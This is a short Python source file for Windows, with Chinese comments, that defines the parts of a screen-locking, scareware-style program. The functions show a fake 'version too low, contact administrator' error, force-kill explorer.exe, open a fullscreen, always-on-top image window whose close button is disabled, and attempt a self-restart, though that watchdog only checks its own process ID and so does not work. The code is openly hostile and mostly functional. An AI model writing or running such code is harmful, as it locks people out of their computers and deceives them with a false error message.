import os 
import sys
from time import sleep 
from tkinter import Label, Tk 
from PIL import Image, ImageTk 
from ctypes import windll 
from psutil import pid_exists as pidExists 


# 打开提示窗口
def errorWindow():
    try: windll.user32.MessageBoxW(None, "程序版本过低，请联系管理员更新！", "错误", 0x10)
    except: pass


# 结束桌面程序
def endDesktopProgram():
    try: os.system("taskkill /f /im explorer.exe") # 结束桌面程序
    except: pass


# 创建全屏窗口
def fullScreenWindow(path):
    try:
        root = Tk()
        root.attributes('-fullscreen', True) 
        root.attributes('-topmost', True)
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        img = Image.open(path)
        img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        label = Label(root, image=photo)
        label.pack(fill='both', expand=True)
        root.mainloop() 
    except: pass


# 监控进程，如果进程不存在则重启
def monitorProcess():
    try:
        pid = os.getpid()  
        while True:
            sleep(1)  
            if not pidExists(pid): os.execl(sys.executable, sys.executable, *sys.argv) 
    except: pass
 
